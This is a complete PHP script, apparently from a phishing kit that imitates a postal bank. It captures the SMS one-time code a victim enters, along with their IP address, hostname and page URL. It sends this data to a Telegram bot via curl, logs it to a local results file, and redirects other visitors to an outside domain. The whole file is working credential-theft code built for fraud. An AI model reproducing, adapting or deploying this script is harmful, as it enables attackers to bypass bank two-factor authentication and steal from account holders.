<?php
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
if ($_POST['type'] == "code") {
include '../config.php';

$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$back = "index4.html";
$hostname = gethostbyaddr($ip);
$message .= "~~~~~~ code SMS bnq postal~~~~~~\n";
$message .= "code              : ".$_POST['codeOTPSaisi']."\n";
$message .= "~~~~~~~~~ details user ~~~~~~~~~~~\n";
$message .= "IPs              : $ip\n";
$message .= "HN               : $hostname\n";
$message .= " U7l             : $link\n";
$message .= "~~~~~~~ copyright by metri~~~~~~~\n";
$params=[
            'chat_id'=>$chat_id,
            'text'=>$message,
            ];
            $ch = curl_init($METRI_TOKEN . '/sendMessage');
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $result = curl_exec($ch);
            curl_close($ch);

 
file_put_contents("../rezult/postal-rzlt.txt", $message, FILE_APPEND); 


header("Location: $back");
}
else {
header("location: http://guiminer.co.technology/rd/");
}

?>